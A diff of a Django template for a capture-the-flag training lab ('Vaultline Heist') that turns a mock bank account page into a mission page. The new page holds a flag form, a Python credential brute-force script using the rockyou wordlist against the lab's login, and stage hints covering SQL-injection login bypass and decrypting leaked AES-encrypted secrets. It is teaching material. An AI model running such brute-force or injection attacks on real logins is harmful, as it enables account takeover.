@@ -1,67 +1,123 @@
 {% extends "base_app.html" %}
 {% load static icons %}
-{% block title %}Your vault · {{ SITE_NAME }}{% endblock %}
-{% block page_title %}Account overview{% endblock %}
+{% block title %}Mission · {{ SITE_NAME }}{% endblock %}
+{% block page_title %}Your mission{% endblock %}
 
 {% block content %}
-<div id="vault-root" {% if just_accessed %}data-just-accessed="1"{% endif %}>
-  <div class="page-head">
-    <div>
-      <h1>Welcome back, <span class="gradient-text mono">{{ user.username }}</span></h1>
-      <p class="sub">You're signed in to your Vaultline private account.</p>
-    </div>
-    <span class="chip">{% icon "lock" "icon" %} Secure session</span>
+<div class="page-head">
+  <div>
+    <h1 style="margin-bottom:2px;">Vaultline Heist</h1>
+    <p class="sub faint">Breach your assigned client, open their vault, capture the flag.</p>
   </div>
+  <a href="{% url 'challenge:scoreboard' %}" class="btn btn-outline btn-sm">{% icon "activity" "icon" %} Scoreboard</a>
+</div>
 
-  <!-- Balance card -->
-  <div class="card" style="background:linear-gradient(150deg, #0f2b24 0%, #0b1017 60%); margin-bottom:18px;">
-    <div class="spread" style="flex-wrap:wrap; gap:16px;">
-      <div>
-        <div class="stat-label">Total balance</div>
-        <div class="mono" style="font-size:2.2rem; font-weight:700; letter-spacing:-.02em; margin-top:6px;">$128,940<span class="faint">.20</span></div>
-        <div class="mono faint" style="font-size:.85rem; margin-top:4px;">Vaultline Private · Account •••• 4921 · USD</div>
-      </div>
-      <span class="chip" style="border-color:rgba(47,224,176,.3); color:var(--brand); align-self:flex-start;">{% icon "activity" "icon" %} +2.4% this month</span>
-    </div>
+{% if flag_result %}
+  <div class="alert alert-{{ flag_result.0 }}" style="margin-bottom:16px;">
+    {% icon "check-circle" "icon" %}<span>{{ flag_result.1 }}</span>
   </div>
+{% endif %}
 
-  <div class="grid grid-3">
-    <div class="stat"><div class="stat-top"><span class="stat-label">Available</span><span class="stat-ico">{% icon "zap" "icon" %}</span></div><div class="stat-value" style="font-size:1.5rem;">$96,210</div></div>
-    <div class="stat"><div class="stat-top"><span class="stat-label">Savings</span><span class="stat-ico c">{% icon "layers" "icon" %}</span></div><div class="stat-value" style="font-size:1.5rem;">$28,730</div></div>
-    <div class="stat"><div class="stat-top"><span class="stat-label">Cards</span><span class="stat-ico v">{% icon "lock" "icon" %}</span></div><div class="stat-value" style="font-size:1.5rem;">2</div></div>
+{% if not target %}
+  <div class="card">
+    <div class="card-title">{% icon "alert" "icon" %} No target assigned yet</div>
+    <p class="subtle" style="margin-top:8px;">
+      You don't have a target account yet. Ask your instructor to run
+      <span class="mono">provision_challenge --assign</span>, then refresh this page.
+    </p>
   </div>
+{% else %}
 
-  <div class="card mt-2">
-    <div class="card-title">Recent activity</div>
-    <div class="table-wrap">
-      <table class="data">
-        <thead><tr><th>Date</th><th>Description</th><th>Amount</th></tr></thead>
-        <tbody>
-          <tr><td class="faint mono">Aug 21</td><td>Transfer — Meridian Holdings</td><td class="mono">−$2,400.00</td></tr>
-          <tr><td class="faint mono">Aug 19</td><td>Deposit — Payroll</td><td class="mono" style="color:var(--success)">+$8,150.00</td></tr>
-          <tr><td class="faint mono">Aug 18</td><td>Card — Blue Bottle Coffee</td><td class="mono">−$6.75</td></tr>
-          <tr><td class="faint mono">Aug 17</td><td>Transfer — Savings</td><td class="mono">−$1,000.00</td></tr>
-        </tbody>
+  <div class="grid grid-2" style="gap:18px; align-items:start;">
+    <!-- Target + progress -->
+    <div class="card">
+      <div class="card-title">{% icon "target" "icon" %} Your target</div>
+      <table class="data" style="margin-top:8px;">
+        <tr><td class="faint">Client username</td><td class="mono" style="font-weight:700;">{{ target.username }}</td></tr>
+        <tr><td class="faint">Portal login</td><td class="mono">{{ request.scheme }}://{{ request.get_host }}/portal/login/</td></tr>
       </table>
-    </div>
-  </div>
-</div>
 
-<!-- Celebration overlay (fires once after a successful sign-in) -->
-<div id="win-overlay" class="win-overlay" hidden>
-  <canvas id="confetti" class="win-confetti"></canvas>
-  <div class="win-card">
-    <div class="win-trophy">🔓</div>
-    <div class="win-kicker">ACCESS GRANTED</div>
-    <h2 class="win-title">You're in.</h2>
-    <p class="subtle">Signed in to <span class="mono">{{ user.username }}</span>'s Vaultline account.</p>
-    <div class="win-actions" style="margin-top:22px;">
-      <button type="button" class="btn btn-primary btn-lg" id="win-close">Enter account</button>
+      <div class="card-title" style="margin-top:18px;">Progress</div>
+      <ul class="check" style="margin-top:8px; list-style:none; padding-left:0;">
+        {% for step in target.progress %}
+          <li style="display:flex; align-items:center; gap:10px; padding:4px 0;">
+            <span style="width:16px; display:inline-block;">{% if step.done %}{% icon "check" "icon" %}{% else %}<span class="faint">○</span>{% endif %}</span>
+            <span class="{% if step.done %}{% else %}faint{% endif %}">{{ step.label }}</span>
+          </li>
+        {% endfor %}
+      </ul>
+      <div class="spread" style="margin-top:10px;">
+        <span class="faint mono" style="font-size:.85rem;">{{ target.stages_done }}/5 stages</span>
+        <span class="badge {% if target.is_solved %}badge-completed{% endif %}">{{ target.points }} pts</span>
+      </div>
+    </div>
+
+    <!-- Submit flag -->
+    <div class="card">
+      <div class="card-title">{% icon "key" "icon" %} Submit flag</div>
+      <p class="subtle" style="margin-top:8px;">Found <span class="mono">HM{…}</span> in the vault? Submit it to score.</p>
+      <form method="post" action="{% url 'challenge:flag_submit' %}" style="margin-top:10px;">
+        {% csrf_token %}
+        <div class="form-row">
+          <input type="text" name="flag" class="input mono" placeholder="HM{...}" autocomplete="off" {% if target.is_solved %}disabled{% endif %}>
+        </div>
+        <button type="submit" class="btn btn-primary btn-block" {% if target.is_solved %}disabled{% endif %}>
+          {% if target.is_solved %}Captured ✓{% else %}Submit flag{% endif %}
+        </button>
+      </form>
     </div>
   </div>
-</div>
+
+  <!-- Starter script -->
+  <div class="card mt-2">
+    <div class="spread">
+      <div class="card-title" style="margin:0;">{% icon "code" "icon" %} Starter script (brute-force)</div>
+      <button type="button" class="btn btn-ghost btn-sm" onclick="copyStarter(this)">{% icon "copy" "icon" %} Copy</button>
+    </div>
+    <pre class="code-block" id="starter" style="margin-top:10px; white-space:pre; overflow-x:auto;"><code>import requests
+
+URL      = "{{ request.scheme }}://{{ request.get_host }}/portal/login/"
+USERNAME = "{{ target.username }}"
+
+with open("rockyou.txt", encoding="latin-1", errors="ignore") as f:
+    for line in f:
+        password = line.strip()
+        if not password:
+            continue
+        r = requests.post(URL, json={"username": USERNAME, "password": password})
+        if r.json().get("success"):
+            print("FOUND:", password)
+            break
+</code></pre>
+    <p class="faint" style="margin-top:8px; font-size:.85rem;">
+      Download <span class="mono">rockyou.txt</span> (a standard wordlist), put it next to this script, and run it.
+      Ask the AI assistant or search online if you get stuck at any stage.
+    </p>
+  </div>
+
+  <!-- Hints -->
+  <div class="card mt-2">
+    <div class="card-title">{% icon "book" "icon" %} Hints</div>
+    <details style="margin-top:6px;"><summary>Stage 1 — getting in</summary>
+      <p class="subtle" style="margin-top:6px;">Two ways in: brute-force the password with a wordlist (rockyou), or SQL-injection. The login is a classic vulnerable form — search "SQL injection login bypass".</p></details>
+    <details style="margin-top:6px;"><summary>Stage 2 — the vault is locked</summary>
+      <p class="subtle" style="margin-top:6px;">The vault says to rotate your password first. Look in <strong>Profile → Data</strong> while you're there.</p></details>
+    <details style="margin-top:6px;"><summary>Stage 3 — the data export</summary>
+      <p class="subtle" style="margin-top:6px;">"Download my data" gives a JSON file. It over-shares: it includes two secrets (<span class="mono">account_key</span>, <span class="mono">vault_key</span>) and two encrypted blobs (<span class="mono">account_blob</span>, <span class="mono">vault_blob</span>).</p></details>
+    <details style="margin-top:6px;"><summary>Stage 4 — decrypt the credentials</summary>
+      <p class="subtle" style="margin-top:6px;">Each blob is <strong>AES-256</strong>. <strong>Website</strong>: open an "aes256" decrypt tool (e.g. <span class="mono">encode-decode.com</span>), paste a blob as the text and its matching key (<span class="mono">account_key</span>/<span class="mono">vault_key</span>) as the secret, hit Decrypt. Or open the bundled <span class="mono">tools/vaultline_decrypt.html</span>, or run <span class="mono">tools/decrypt_vault.py</span>. <span class="mono">vault_blob</span> + <span class="mono">vault_key</span> → the vault id + password for Stage 5.</p></details>
+    <details style="margin-top:6px;"><summary>Stage 5 — open the vault</summary>
+      <p class="subtle" style="margin-top:6px;">Rotate your password (unlocks the input), then type the decrypted vault id + vault password. Download the file — the flag is inside.</p></details>
+  </div>
+
+{% endif %}
 {% endblock %}
 
 {% block scripts %}
-<script src="{% static 'js/celebrate.js' %}"></script>
+<script>
+  function copyStarter(btn){
+    const text = document.getElementById("starter").innerText;
+    navigator.clipboard.writeText(text).then(()=>{ btn.textContent = "Copied ✓"; setTimeout(()=>location.reload && (btn.textContent="Copy"), 1500); });
+  }
+</script>
 {% endblock %}
